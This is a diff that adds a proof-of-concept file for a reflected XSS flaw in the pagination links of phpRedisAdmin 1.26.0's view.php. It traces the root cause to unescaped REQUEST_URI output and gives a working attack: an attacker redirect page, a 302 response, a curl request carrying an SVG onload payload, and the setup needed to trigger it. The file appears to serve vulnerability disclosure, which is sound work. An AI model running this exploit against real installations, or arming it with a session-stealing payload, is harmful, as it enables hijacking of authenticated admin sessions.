@@ -1,0 +1,41 @@
+PRA-01 PoC — Reflected XSS in phpRedisAdmin 1.26.0 view.php pagination
+=======================================================================
+
+Root cause: view.php:149 builds the pagination URL from getRelativePath()
+(includes/functions.inc.php:104-106), which returns the raw REQUEST_URI with no
+HTML escaping; the value is interpolated into <a href="$url&page=N"> anchors and
+echoed at view.php:196 and view.php:310.
+
+Delivery: raw metacharacters must arrive via an HTTP 30x redirect (browsers
+percent-encode typed URLs). Attacker page:
+
+    <script>location.href = '/view.php?s=0&d=0&key=users&page=2"><svg/onload=console.log(1)>&page=999';</script>
+
+or equivalently a 302 response:
+
+    HTTP/1.1 302 Found
+    Location: /view.php?s=0&d=0&key=users&page=2"><svg/onload=console.log(1)>&page=999
+
+Code-level proof (curl, --path-as-is so curl does not normalize the query):
+
+    curl --path-as-is 'http://<TARGET>/view.php?s=0&d=0&key=users&page=2"><svg/onload=console.log(1)>&page=999'
+
+Expected: HTTP 200; the payload appears UNESCAPED 2x in the body (both echo
+sites); the attacker's double quote breaks out of the href attribute and
+<svg/onload=console.log(1)> is parsed as a live SVG element. The trailing
+&page=999 is stripped by view.php's preg_replace('/&page=(\d+)/i', '', ...) but
+the injected markup survives.
+
+Negative control:
+
+    curl --path-as-is 'http://<TARGET>/view.php?s=0&d=0&key=users&page=1'
+    -> clean pagination anchors, marker string 0 occurrences.
+
+Prerequisites for the pagination bar to render:
+- target key is hash/list/set/zset with element count > count_elements_page
+  (default 100, includes/config.sample.inc.php:87); e.g. a list "users" with
+  150 elements: redis-cli RPUSH users $(seq -f 'u%g' 1 150)
+
+Verified payload is harmless (console.log(1)). XSS is meaningful when
+login/cookie_auth is enabled — the script then runs inside an authenticated
+admin session.
